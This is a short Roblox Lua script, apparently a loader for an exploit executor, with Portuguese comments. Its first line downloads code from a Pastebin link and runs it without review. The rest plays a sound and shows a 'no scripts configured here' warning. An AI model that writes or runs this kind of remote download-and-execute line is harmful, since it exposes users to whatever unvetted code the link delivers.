-- ISSO AVISA WAUNDO NÃO AH FUNÇÕES NAS PÁGINAS. -- RHYAN57.
loadstring(game:HttpGet("https://pastebin.com/raw/qH9PEhfQ"))()

-- ERROR
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://5914602124"
sound.Volume = 1
sound.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
sound:Play()
sound.Ended:Connect(function()
    sound:Destroy()
end)
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "⚠️ !ATENÇÃO! ⚠️",
    Text = "Não a scripts configurados neste local! ",
    Icon = "rbxassetid://13264701341",
    Duration = 9
})
